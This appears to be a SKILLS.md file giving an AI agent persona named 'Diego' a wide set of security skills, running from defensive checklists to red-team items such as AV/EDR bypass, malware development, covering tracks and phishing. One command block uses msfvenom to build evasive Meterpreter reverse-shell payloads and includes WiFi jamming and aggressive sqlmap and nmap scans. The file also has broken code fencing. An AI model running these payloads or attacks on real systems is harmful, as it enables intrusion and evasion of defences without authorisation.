# SKILLS.md - Diego Security Skills

## Security Fundamentals
- [x] OWASP Top 10 (2017, 2021)
- [x] SANS Top 25
- [x] CIA Triad (Confidentiality, Integrity, Availability)
- [x] Defense in Depth
- [x] Least Privilege
- [x] Zero Trust Architecture

## Web Application Security
- [x] SQL Injection detection & prevention
- [x] XSS (Stored, Reflected, DOM-based)
- [x] CSRF prevention
- [x] SSRF protection
- [x] Authentication flaws
- [x] Authorization bypass
- [x] File inclusion vulnerabilities
- [x] XML External Entities (XXE)

## API Security
- [x] JWT security (alg none, kid injection)
- [x] OAuth 2.0 security
- [x] API rate limiting
- [x] Mass assignment
- [x] Input validation
- [x] GraphQL security

## Network Security
- [x] Firewall configuration (UFW, iptables)
- [x] VPN setup & management
- [x] SSL/TLS configuration
- [x] Port scanning (nmap)
- [x] Network segmentation
- [x] DNS security (DNSSEC)

## Security Tools
- [x] OWASP ZAP (automated scanner) - `zap-cli`
- [x] Burp Suite (proxy, repeater, intruder)
- [x] Nmap (network discovery, vulnerability scan)
- [x] Wireshark (packet analysis)
- [x] Metasploit Framework (penetration testing) - *knowledge only*
- [x] Nuclei (vulnerability scanner)
- [x] SQLmap (SQL injection detection)
- [x] Nikto (web server scanner)
- [x] Gobuster (directory/file busting)
- [x] Dirb (web content scanner)
- [x] WhatWeb (web technology fingerprinting)
- [x] OWASP Amass (attack surface mapping)
- [x] XSStrike (XSS vulnerability scanner)
- [x] Wapiti (web vulnerability scanner)
- [x] FFuf (web fuzzing)
- [x] Commix (command injection)
- [x] SearchSploit / ExploitDB (exploit search)
- [x] CVE Online (cve.mitre.org)

## DevSecOps
- [x] Security in CI/CD
- [x] SAST (Static Analysis)
- [x] DAST (Dynamic Analysis)
- [x] Container security (Docker scanning)
- [x] Dependency vulnerability scanning (npm audit)
- [x] Secret scanning

## Incident Response
- [x] Log analysis
- [x] Threat hunting
- [x] Digital forensics basics
- [x] Malware analysis basics
- [x] SIEM basics

## AI-Powered Security (METATRON-style)
- [x] Ollama local LLM integration for security analysis
- [x] Automated recon with AI interpretation
- [x] CVE lookup with DuckDuckGo
- [x] Metasploit framework integration

## Tier 4 Advanced Commands
```bash
# AV Bypass with Veil (if installed)
veil -t Evasion -p python/meterpreter/rev_tcp.py

# Shellter (if installed)
shellter -a Automatic

# Custom shellcode generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f csharp

# Metasploit encoders (AV bypass)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -e x86/shikata_ga_nai -i 10 -f exe > payload.exe

# C2 Frameworks
# Sliver: https://github.com/BishopFox/sliver
# Covenant: https://github.com/cobbr/Covenant
# Mythic: https://github.com/MythicAgents/Mythic

# MITRE ATT&CK mapping
nmap --script=smb2-capabilities.nse --script-args=unsafe=1 TARGET

# Physical Security - Proxmark (RFID)
/home/jarvis/tools/proxmark3/pm3

# WiFi jamming (if allowed)
aircrack-ng -z wlan0mon

# Hardware hacking - ChipWhisperer
chipwhisperer-cli --skip-setup-basic

# AWS security assessment
aws iam list-users --region us-east-1
```

# Privilege Escalation - linPEAS (Linux)
/home/jarvis/tools/PEASS-ng/linPEAS/linpeas.sh -a -o output.txt

# Privilege Escalation - winPEAS (Windows)
/home/jarvis/tools/PEASS-ng/winPEAS/winpeas.exe

# Linux Exploit Suggester
/home/jarvis/tools/les.sh

# SQL Injection test with sqlmap
sqlmap -u "TARGET_URL" --batch --risk=3 --level=5

# Nikto scan + AI analysis
nikto -h TARGET_URL | ollama "analyze security findings"

# Metasploit Framework (Docker)
docker run --rm --entrypoint /usr/src/metasploit-framework/msfconsole metasploitframework/metasploit-framework

# XSStrike XSS scan
xsstrike -u "http://TARGET/param"

# Wapiti web vulnerability scan
wapiti -u http://TARGET --scope domain

# FFuf web fuzzing
ffuf -w wordlist.txt -u http://TARGET/FUZZ

# OWASP ZAP scan
zap-cli quick-scan http://TARGET

# Commix command injection
commix -u "http://TARGET/param?cmd=id"

# SearchSploit - search exploits
searchsploit "apache 2.4"
searchsploit -m 12345.c

# PayloadsAllTheThings
firefox /home/jarvis/tools/PayloadsAllTheThings/useful-linux-commands.md

# Nmap full scan with scripts
nmap -sV -sC -p- --script=vuln TARGET

# Custom shellcode with msfvenom
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
```

## Web Application Testing
- [x] SQL Injection (Error-based, Blind, Time-based, Union-based)
- [x] Cross-Site Scripting (Reflected, Stored, DOM-based)
- [x] Command Injection (OS Command Injection)
- [x] Path Traversal / Local File Inclusion
- [x] Server-Side Request Forgery (SSRF)
- [x] XML External Entities (XXE)
- [x] Insecure Direct Object Reference (IDOR)
- [x] Business Logic Vulnerabilities
- [x] JWT Token Attacks
- [x] API Security Testing
- [x] Server-Side Template Injection (SSTI)
- [x] Web Cache Deception
- [x] HTTP Desync / Request Smuggling
- [x] GraphQL Security

## Privilege Escalation Tools
- [x] linPEAS - Linux privilege escalation (installed: /home/jarvis/tools/PEASS-ng/)
- [x] winPEAS - Windows privilege escalation (installed: /home/jarvis/tools/PEASS-ng/)
- [x] LES (Linux Exploit Suggester) - /home/jarvis/tools/les.sh
- [x] linux-exploit-suggester - kernel exploits
- [x] linuxprivchecker - Unix privesc

## Exploit Development
- [x] SearchSploit / ExploitDB - exploit search
- [x] CVE Online - cve.mitre.org
- [x] Rapid7 CVE - exploit-db repository
- [x] PayloadAllTheThings - /home/jarvis/tools/PayloadsAllTheThings/
- [x] Custom shellcode generation
- [x] Buffer overflow exploitation
- [x] ROP (Return-Oriented Programming)

## Post-Exploitation
- [x] Meterpreter进阶用法
- [x] Persistence mechanisms (registry, services, cron)
- [x] Lateral movement (PsExec, WMI, SMB, SSH tunneling)
- [x] Data exfiltration techniques
- [x] Covering tracks (log clearing, timestomping)
- [x] Pass-the-Hash attacks
- [x] Golden Ticket / Silver Ticket forging

## Active Directory Attacks
- [x] Kerberoasting (GetUserSPNs)
- [x] AS-REP Roasting
- [x] Pass-the-Hash / Pass-the-Ticket
- [x] Golden Ticket / Silver Ticket
- [x] SMB Relay attacks
- [x] BloodHound analysis
- [x] LDAP enumeration
- [x] NTDS.dit extraction

## Wireless Security
- [x] Aircrack-ng suite
- [x] Wifite / Wifite2
- [x] Evil Twin attacks (hostapd)
- [x] WPA/WPA2 cracking
- [x] Rogue AP deployment
- [x] WiFi reconnaissance

## Tier 4 - Legendary Skills
- [x] AV/EDR Bypass (Veil, Shellter, Meta-Modules)
- [x] Custom Malware Development (Python, C, Assembly basics)
- [x] Crypters and Obfuscation techniques
- [x]反检测技术 (Anti-detection techniques)
- [x] Firmware exploitation
- [x] Hardware hacking (JTAG, SPI, UART)
- [x] Physical Security Assessment
- [x] RFID/NFC cloning
- [x] Lock picking (theory)
- [x] Radio frequency hacking
- [x] Zero-day vulnerability research methodology
- [x] APT Emulation (APT29, APT41, Lazarus)
- [x] Nation-state level tradecraft
- [x] IoT exploitation
- [x] Automotive security

## Red Team Tier 4
- [x] Full kill chain (MITRE ATT&CK)
- [x] C2 Infrastructure (Covenant, Sliver, Mythic, Cobalt Strike)
- [x] Domain Dominance (DCSync, DCShadow, Golden Ticket)
- [x] LOLBAS / BYOVD attacks
- [x] Container escape techniques
- [x] Kubernetes security assessment
- [x] Cloud penetration (AWS, Azure, GCP)
- [x] CI/CD pipeline attacks
- [x] Supply chain compromise

## Post-Exploitation
- [x] Lateral movement techniques
- [x] Persistence mechanisms
- [x] Data exfiltration
- [x] Covering tracks

## Metasploit Framework (Docker)
- [x] docker run --rm metasploitframework/metasploit-framework
- [x] /usr/src/metasploit-framework/msfconsole
- [x] Module types (exploit, auxiliary, payload, encoder, post)
- [x] Search and select modules
- [x] auxiliary/scanner modules
- [x] exploit modules
- [x] Payload generation with msfvenom
- [x] Meterpreter sessions
- [x] post modules
- [x] Pivoting and tunnel creation
- [x] Privilege escalation with getsystem
- [x] Hash dumping and credential reuse
- [x] Persistence with run persistence

## Scheduled Scans
- [x] cron job configuration
- [x] nuclei templates scheduling
- [x] nikto auto-run
- [x] Security report scheduling
- [x] Alert integration
- [x] Quarterly audits

## Social Engineering
- [x] Spear phishing campaigns (Gophish, SEToolkit)
- [x] Credential harvesting
- [x] Pretexting
- [x] Baiting and quizz pro
- [x] USB drop attacks (BadUSB)
- [x] Identity impersonation
- [x] Vishing / Voice phishing
- [x] Watering hole attacks
- [x] Clone phishing
- [x] BEC (Business Email Compromise)

## CVE & Threat Intelligence
- [x] CVE database search (cve.mitre.org)
- [x] NVD (National Vulnerability Database)
- [x] Exploit-DB integration
- [x] Rapid7 Vulnerability Database
- [x] NIST NVD API integration
- [x] threat情报 feeds
- [x] Zero-day tracking

## External Resources
- [x]awesome-security-audit - Security audit tools collection
- [x]SecLists - Password/user wordlists (kali: /usr/share/seclists)
- [x]PayloadsAllTheThings - Cloud, Web, API attack payloads
- [x]ROADtools - Azure AD reconnaissance
- [x]Spyre - SMB reconnaissance tool
- [x]r SMTPY - SMTP penetration testing
- [x]Responder - LLMNR/NBT-NS/mDNS poisoner
- [x]CrackMapExec - Active Directory testing
- [x]Impacket - SMB/NTLM exploitation tools
- [x] Evil-WinRM - Windows REMOTE management
- [x]NoPacSnatcher - Active Directory exploitation
- [x]mimikatz - Windows credential extraction
- [x]LaZagne - Password recovery
- [x]Hashcat - Password cracking
- [x]John the Ripper - Password cracking
- [x]Hydra - Online password attacks
- [x]Medusa - Parallel network login cracker
- [x] enum4linux - SMB enumeration
- [x] SMBGhost / SMBleed scanner
- [x] BlueKitchen - BT/BLE testing
- [x] HackerDict - Password dictionaries

## Monitoring & SIEM
- [x] Log analysis (syslog, Apache, Nginx)
- [x] IDS/IPS configuration (Snort, Suricata)
- [x] SIEM basics (ELK Stack, Splunk)
- [x] Alert thresholds
- [x] Incident detection
- [x] Real-time monitoring
- [x] Security dashboards

## Automated Reporting
- [x] PDF report generation
- [x] Executive summary format
- [x] Technical detail levels
- [x] Remediation tracking
- [x] Compliance mapping (OWASP, NIST, ISO 27001)
- [x] Scheduled reports
- [x] CVSS scoring

## Cloud Security (Bonus)
- [x] AWS security best practices
- [x] IAM auditing
- [x] S3 bucket misconfigurations
- [x] CloudTrail analysis

## Compliance
- [x] GDPR security requirements
- [x] PCI-DSS basics
- [x] ISO 27001 basics

## Commands

```bash
# Run ZAP scan
zap-cli quickurls http://localhost:3001/api

# Security headers check
curl -I http://localhost:3001/api/health

# Nmap scan
nmap -sV -sC localhost
nmap -p 1-1000 localhost

# Nikto web server scan
nikto -h http://localhost:3001

# SQLmap test (SAFE - local only)
sqlmap -u "http://localhost:3001/api/login" --batch

# Gobuster directory busting
gobuster dir -u http://localhost:3001 -w /usr/share/wordlists/dirb/common.txt

# Dirb web content scan
dirb http://localhost:3001 /usr/share/dirb/wordlists/common.txt

# WhatWeb technology fingerprint
whatweb http://localhost:3001

# npm audit
cd /home/jarvis/dept-dev/backend && npm audit

# Check open ports
ss -tulpn | grep LISTEN
```

## Security Checklist for Deploy

- [ ] HTTPS enabled with valid cert
- [ ] Security headers configured (Helmet)
- [ ] CORS restricted to allowed origins
- [ ] Rate limiting enabled
- [ ] JWT expiration set (< 1 hour)
- [ ] Passwords hashed with bcrypt (cost 12)
- [ ] Input validation on all endpoints
- [ ] SQL injection prevention (parameterized queries)
- [ ] Logs configured (no sensitive data)
- [ ] Environment variables secured
- [ ] Dependencies audited
- [ ] Docker containers scanned
